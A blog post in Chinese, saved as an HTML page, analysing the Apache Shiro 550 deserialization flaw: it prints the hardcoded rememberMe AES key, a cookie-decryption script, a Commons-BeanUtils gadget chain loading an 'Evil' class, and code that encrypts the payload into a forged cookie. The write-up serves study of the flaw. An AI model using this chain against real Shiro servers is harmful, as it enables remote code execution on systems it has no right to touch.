@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic%7CRoboto+Slab:300,300italic,400,400italic,700,700italic%7CPT+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"f4nx1ng.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInDown"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Apache Shiro是一个开源的安全框架，提供身份验证&#x2F;授权&#x2F;密码学和会话管理。在它编号为550的issue中爆出了严重的java反序化漏洞。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro漏洞分析(一)——Shiro550">
+<meta property="og:url" content="https://f4nx1ng.github.io/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/index.html">
+<meta property="og:site_name" content="f4nx1ng&#39;s blog">
+<meta property="og:description" content="Apache Shiro是一个开源的安全框架，提供身份验证&#x2F;授权&#x2F;密码学和会话管理。在它编号为550的issue中爆出了严重的java反序化漏洞。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/%E5%88%86%E6%9E%90.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/%E5%90%8E%E5%88%86%E6%9E%90.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/%E7%BB%93%E6%9E%9C.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/CB.png">
+<meta property="article:published_time" content="2024-08-17T12:02:20.000Z">
+<meta property="article:modified_time" content="2024-08-17T12:06:42.576Z">
+<meta property="article:author" content="f4nx1ng">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="Shiro">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://f4nx1ng.github.io/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/%E5%88%86%E6%9E%90.png">
+
+
+<link rel="canonical" href="https://f4nx1ng.github.io/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://f4nx1ng.github.io/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/","path":"2024/08/17/Shiro漏洞分析-一-——Shiro550/","title":"Shiro漏洞分析(一)——Shiro550"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Shiro漏洞分析(一)——Shiro550 | f4nx1ng's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">f4nx1ng's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">11</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">12</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#shiro"><span class="nav-number">1.</span> <span class="nav-text">Shiro</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#section"><span class="nav-number">1.1.</span> <span class="nav-text">550</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.1.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%87%8D%E7%9C%8B%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.3.</span> <span class="nav-text">重看漏洞原理</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#cc%E9%93%BE%E5%88%A9%E7%94%A8"><span class="nav-number">1.1.4.</span> <span class="nav-text">CC链利用</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#cb%E9%93%BE%E5%88%A9%E7%94%A8"><span class="nav-number">1.1.5.</span> <span class="nav-text">CB链利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">2.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="f4nx1ng"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">f4nx1ng</p>
+  <div class="site-description" itemprop="description">A big noob</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/f4nx1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;f4nx1ng" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://f4nx1ng.github.io/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="f4nx1ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="f4nx1ng's blog">
+      <meta itemprop="description" content="A big noob">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Shiro漏洞分析(一)——Shiro550 | f4nx1ng's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Shiro漏洞分析(一)——Shiro550
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-08-17 20:02:20 / 修改时间：20:06:42" itemprop="dateCreated datePublished" datetime="2024-08-17T20:02:20+08:00">2024-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">JAVA安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Apache
+Shiro是一个开源的安全框架，提供身份验证/授权/密码学和会话管理。在它编号为550的issue中爆出了严重的java反序化漏洞。</p>
+<span id="more"></span>
+<h4 id="shiro">Shiro</h4>
+<h5 id="section">550</h5>
+<h6 id="前言">前言</h6>
+<p>Apache
+Shiro是一个开源的安全框架，提供身份验证/授权/密码学和会话管理。在它编号为550的issue中爆出了严重的java反序化漏洞。</p>
+<p>在 Apache Shiro&lt;=1.2.4 版本中 AES
+加密时采用的key是<strong>硬编码</strong>在代码中的，这就为伪造cookie提供了机会。只要rememberMe的AES加密密钥泄露，无论
+shiro是什么版本都会导致反序列化漏洞。</p>
+<p>Shiro的“记住我”功能是设置cookie当中的rememberMe来实现的。当后端接收到来自未经身份验证的用户的请求的时候，会通过以下的操作来寻找他们记住的身份。</p>
+<p>1.检索cookie中的Remember的值</p>
+<p>2.Base64解码</p>
+<p>3.使用AES解密</p>
+<p>4.反序列化（ObjectInputStream）</p>
+<p>所以问题出在AES加解密密钥的硬编码上面，因为硬编码密钥所以就有可能会造成密钥的泄露，有了密钥之后我们就可以伪造一个RememberMe字符串通过这个字符串反序列化恶意的对象</p>
+<h6 id="漏洞分析">漏洞分析</h6>
+<p>因为是硬编码的密钥所以我们可以通过检索的方式从代码里面找到AES加密锁使用的密钥。</p>
+<img data-src="/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/%E5%88%86%E6%9E%90.png" class>
+<p>他的代码段是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>因为是对称加密所以加密密钥也是解密密钥。我们可以看看他的解密过程是如何进行的</p>
+
+<p>在上面的代码段中拿了一个cipherService对象，然后调用了里面的decrypt方法传进了一个encrypted和getDecryptionCipherKey()，这个encrypted不用多说他就是传过来的一个已经加密的数据，getDecryptionCipherKey()事实上是他本身的一个getter方法拿到的就是刚才看到的密钥。</p>
+<p>单步进入这个decrypt方法我们发现cipherService其本身是一个接口，所以要想找到解密过程的具体实现需要去找一个实现了该接口的类。</p>
+
+<p>我们最终发现名为JcaCipherService的类实现了该接口</p>
+
+<p>进入该类我们找到了目标函数</p>
+
+<p>为了之后的分析过程，我们先下断点然后对之后的内容进行处理，我们发现它使用CBC模式进行解密的</p>
+
+<p>有了这些之后我们再重发一次包，拿到里面的rememberMe，然后去进行解密</p>
+
+<p>然后我们编写python脚本，进行解密，解密后存放到文件当中。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_rememberMe</span>():</span><br><span class="line">    rememberMe = <span class="string">&quot;Iuca999LdL93Y/H/HylqhD+n9ugtPvqISGMzo/BT0BLAfE3BqHLYJVGF7M15Ii8TJkj051A8A6Jm/uaaHoBaAk8z9sKFrJWT2n7oNuVFoTd17yS391/NVqdguGruFuqhF7dd0Pgij35joO+0YrXsyxNDY8Aq2+wO9E1meuWW/Z114inv0rlbgH4OOtwRhyet+hui/Fxi9eMGBhG2EjtNRb2Y5LuoiItxgdXlDrpKb17HAOvhOT+iqynTUGXrw0+aL+4i00HQJaPGiSSa8EWnlhx26DsCEUofMuOxKutaJUs9a6EJ9PmX45eWHElLPb+MINGv/x+qnMFWLVbLQVy2uG4h0KMydSDHlIW0m3Mb4CN9qC2x2+zwOPl8jp+SHI5l42mW7PV9pEbE8jVSk02bcLKsoh1jvTFf71LRfihvkCTB4o6n2TzaPNMJV2UXUDcChpdnLxlWr7ZQqXohwRf3zXXf6e6sUza5wlrVK6d9AR/M5xJ+0UNcgkVJZS+ifcP6&quot;</span></span><br><span class="line">    rememberMe_after = base64.b64decode(rememberMe)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;rememberMe&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(rememberMe_after)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_rememberMe</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rememberMe&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">        mode = AES.MODE_CBC</span><br><span class="line">        iv = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">        decrypter = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">        rememberMe_decry = decrypter.decrypt(f.read())</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decrypt.bin&quot;</span>, <span class="string">&quot;wb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(rememberMe_decry)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    decrypt_rememberMe()</span><br></pre></td></tr></table></figure>
+<p>我们用hexdump来查看bin文件，我们可以在第二行的开头看到java序列化数据的标志aced，0005</p>
+
+<p>从前言中我们了解到当rememberMe这个字符串解密之后会进行序列化，但是我们需要看代码进行作证，先找到调用decrypt的地方</p>
+
+<p>单步进入下面的deserialize</p>
+
+<p>然后他会使用默认的java反序列化器（readObejct）进行反序列化</p>
+
+<p>我们既然已经知道了这个超级大漏洞，那么我们该如何利用呢？我们应该找一个依赖，这个依赖存在着一个gadget。</p>
+<h6 id="重看漏洞原理">重看漏洞原理</h6>
+<p>从漏洞挖掘者的角度来看问题，我们从零开始如何找到这个漏洞呢？</p>
+<p>我们首先双击shift去找有关cookie的类，我们最终找到如下的一个类名为CookieRememberMeManager</p>
+<img data-src="/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/%E5%90%8E%E5%88%86%E6%9E%90.png" class>
+<p>在这个类中我们找到了getRememberedSerializedIdentity这个类一看就是可以获得序列化数据当中的身份认证信息的，</p>
+
+<p>我们可以去找谁调用了他最终找到了下面的getRememberedPrincipals</p>
+
+<p>进入convertBytesToPrincipal去看一眼，从里面的代码中我们可以看到我们之前所说的那两个步骤，一个是解密一个是反序列化</p>
+
+<p>我们再去深找调用了谁的反序列化函数，我们可以发现他调用的是原生的反序列化函数</p>
+
+<p>至此我们的逻辑理清了，有了反序列化我们就要去找gadget，网上打CC的一大堆但是事实上依赖里面其实根本没有，除了Test，也就是并不会加载CC</p>
+<h6 id="cc链利用">CC链利用</h6>
+<p>有关commons-collections 3.2.1的打法，这里回看Java安全漫谈笔记部分</p>
+<p>我们上期找到了一个shiro反序列化的真正目的地，原生反序列化</p>
+
+<p>但是这是事实上并不是真正的ois的反序列化，仔细观察就会发现该反序列化的过程来自于ClassResolvingObejctInputStream，这个类是shiro自带的一个类，它里面重写了resolveclass方法</p>
+
+<p>进入ClassUtils看其内部细节，我们发现该方法对传进的类进行了类加载，使用的是loadClass。但是loadClass无法加载数组类，而forname（java自带的forname）可以，且原生的ois当中的resolveClass用的就是forName。</p>
+
+<h6 id="cb链利用">CB链利用</h6>
+<p>关于CB链再shiro中的应用，这里我在使用ysoserial无果之后，选择了使用自己以前使用的链子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getpayload() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">     <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">     <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.get(Evil.class.getName());</span><br><span class="line">     <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">     <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">     setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">     setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">     setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">     <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"></span><br><span class="line">     <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,beanComparator);</span><br><span class="line">     queue.add(<span class="number">1</span>);</span><br><span class="line">     queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">     setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">     setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">     <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">     <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">     oos.writeObject(queue);</span><br><span class="line">     oos.close();</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>使用如下的加密脚本对payload进行加密之后，准备发送poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = CB.getpayload();</span><br><span class="line"><span class="comment">//        byte[] payload = URLDNS.getpayload();</span></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payload, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果如下，很显然我们利用成功了，但是反过来想一想我们为什么只是用ysoserial的时候没有成功。</p>
+<img data-src="/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/%E7%BB%93%E6%9E%9C.png" class>
+<p>我们回看ysoserial当中的commons-beanutils链的利用</p>
+<img data-src="/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/CB.png" class>
+<p>我们发现payload之间的差距发生在了初始化BeanComparator上面，两个不同的payload使用的是两个不同的构造方法。ysoserial使用的是第二个构造方法。</p>
+
+<p>我们回看之前使用ysoserial的报错，他说他找不到ComparableComparator这个类。答案很明显了就是构造方法的锅，所以以后用CB链的时候还是使用自己的链吧</p>
+
+<h4 id="参考文章">参考文章</h4>
+<p>https://www.51cto.com/article/757560.html</p>
+<p>https://www.freebuf.com/vuls/350236.html&amp;wd=&amp;eqid=b26c1c2700153f8900000005646db1ef</p>
+<p>https://tttang.com/archive/1645/#toc_shiro_1</p>
+<p>https://xz.aliyun.com/t/12643</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>f4nx1ng
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://f4nx1ng.github.io/2024/08/17/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80-%E2%80%94%E2%80%94Shiro550/" title="Shiro漏洞分析(一)——Shiro550">https://f4nx1ng.github.io/2024/08/17/Shiro漏洞分析-一-——Shiro550/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+              <a href="/tags/Shiro/" rel="tag"># Shiro</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/08/17/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/" rel="prev" title="Jackson原生反序列化利用链研究">
+                  <i class="fa fa-angle-left"></i> Jackson原生反序列化利用链研究
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">f4nx1ng</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
